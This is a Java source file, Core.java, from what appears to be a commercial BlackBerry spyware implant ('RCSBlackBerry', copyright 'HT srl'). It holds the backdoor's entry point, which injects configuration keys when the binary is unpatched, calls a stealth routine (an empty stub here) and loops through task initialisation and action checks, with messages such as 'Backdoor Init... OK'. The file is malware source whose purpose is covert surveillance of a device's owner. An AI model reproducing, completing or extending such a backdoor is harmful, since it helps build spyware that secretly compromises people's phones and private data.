/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Core.java 
 * Created      : 26-mar-2010
 * *************************************************/

package com.ht.rcs.blackberry;

import com.ht.rcs.blackberry.config.InstanceKeys323;
import com.ht.rcs.blackberry.config.Keys;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

/**
 * Classe Core, contiene il main.
 */
public class Core {

    /** The debug. */
    private static Debug debug;

    /**
     * Lib main.
     * 
     * @param args
     *            the args
     */
    public static void libMain(final String[] args) {
        Utils.sleep(5000);

        debug = new Debug("Core", DebugLevel.VERBOSE);
        debug.init(true, false, true);
        debug.trace("RCSBlackBerry launching");

        if (!Keys.hasBeenBinaryPatched()) {
            debug.warn("Not binary patched, injecting 323");
            InstanceKeys323.injectKeys323();
        }

        Core core = new Core();
        boolean ret = core.run();

        debug.trace("RCSBlackBerry exit, return " + ret);
    }

    /** The task obj. */
    private Task taskObj = new Task();

    /**
     * Run.
     * 
     * @return true, if successful
     */
    public final boolean run() {

        stealth();

        Utils.sleep(5000);

        for (;;) {
            debug.info("init task");
            if (taskObj.taskInit() == false) {
                debug.error("TaskInit() FAILED");
                Msg.demo("Backdoor Init... FAILED");
                Msg.show();
                return false;
            } else {
                debug.trace("TaskInit() OK");
                // CHECK: Status o init?
                Msg.demo("Backdoor Init... OK");
                Msg.show();
            }

            debug.info("starting checking actions");
            if (taskObj.checkActions() == false) {
                debug.error("CheckActions() [Uninstalling?] FAILED");

                Msg.demo("Backdoor Uninstalled, reboot the device");
                return false;
            }
        }
    }

    /**
     * Stealth.
     */
    private void stealth() {
        // TODO Auto-generated method stub

    }
}
